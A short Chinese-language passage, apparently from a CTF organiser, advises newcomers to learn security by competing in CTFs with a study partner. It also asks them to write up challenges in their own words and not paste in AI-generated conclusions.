​	学习安全是有个“捷径”的，那就是不断的参加 ctf 比赛，以赛代学，在这个路程中，几乎不会轻松，有时候一个知识点难住你一周也是有可能的，但是解决后收获的喜悦也是最高的，然后在路上，你会遇到更多技术佬，交流更深入更多的技术，但是一个人走，挺难，所以建议你们能找个搭子，建议同校优先，方便一起打打比赛，互相支持，走向更远

​	关于 AI 使用，一定要`合理使用`，我看了不少交上来的 wp，大部分是将 ai 给出的结论放到 wp 里面了，更有甚者，直接让 AI 给他写 wp,我读完，感觉很抽象，没有一点点“活人气息”，理解我的意思吧，我更希望大家后面学习，写 wp 的时候要写写自己的思考过程，这对出题人和自己都有好处（准确来说，wp 是给你自己写的，毕竟是你的来时路，还请重视下，不管是求职还是申请进入联合战队，一个优质的博客技术栈一定是面试中的加分项